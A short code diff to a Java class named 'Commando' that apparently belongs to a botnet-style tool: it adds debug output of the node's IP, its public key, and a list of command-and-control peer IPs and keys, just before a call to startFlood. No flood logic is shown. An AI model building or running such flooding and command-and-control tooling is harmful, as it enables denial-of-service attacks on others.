@@ -228,6 +228,13 @@ public class Commando {
 		System.out.println("signature " + signature);
 		System.out.println("msg " + msg);
 		System.out.println("request " + request);
+		System.out.println("cec ip "+ nServ.getMyIp().toString() );
+		System.out.println("cec pk "+ nServ.getPki().getPubRSAKeyToString());
+		for (int i = 0; i < nServ.getCommandConquerIps().getSize(); i++) {
+			System.out.println("cec ip "+ nServ.getCommandConquerIps().get(i).getValue1() );
+			System.out.println("cec pk "+ pki.demolishPuK(nServ.getCommandConquerIps().get(i).getValue2()));
+			
+		}
 		startFlood(request);
 		return;
 	}
